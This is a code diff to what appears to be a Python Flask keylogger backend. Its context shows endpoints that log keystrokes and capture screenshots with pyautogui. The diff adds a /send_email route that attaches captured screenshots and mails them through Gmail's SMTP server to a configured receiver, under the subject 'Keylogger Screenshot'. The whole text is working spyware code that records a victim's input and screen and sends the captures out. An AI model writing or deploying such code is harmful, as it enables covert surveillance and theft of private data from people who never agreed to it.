@@ -33,6 +33,8 @@ def log_keystroke():
     return jsonify({'message': 'Keystroke logged successfully'}), 200
 
 
+# --------------------------------------------
+
 import pyautogui
 from datetime import datetime
 
@@ -53,6 +55,52 @@ def capture_screenshot():
         return jsonify({"message": "Screenshot captured", "file": filename}), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+    
+# ------------------------
+
+
+import smtplib
+import mimetypes
+from email.message import EmailMessage
+
+EMAIL_SENDER = os.getenv("SENDER_EMAIL")
+EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
+EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")
+
+@app.route('/send_email', methods=['POST'])
+def send_email():
+    try:
+        data = request.get_json()
+        filename = data.get("filename")
+        if not filename:
+            return jsonify({"error": "Filename required"}), 400
+
+        filepath = os.path.join("screenshots", filename)
+        if not os.path.exists(filepath):
+            return jsonify({"error": "File not found"}), 404
+
+        # Create the email
+        msg = EmailMessage()
+        msg["Subject"] = "Keylogger Screenshot"
+        msg["From"] = EMAIL_SENDER
+        msg["To"] = EMAIL_RECEIVER
+        msg.set_content("Screenshot attached.")
+
+        # Attach the screenshot
+        with open(filepath, "rb") as f:
+            file_data = f.read()
+            maintype, subtype = mimetypes.guess_type(filepath)[0].split("/")
+            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=filename)
+
+        # Send the email
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+            server.send_message(msg)
+
+        return jsonify({"message": "Email sent successfully"}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 
 
 if __name__ == "__main__":
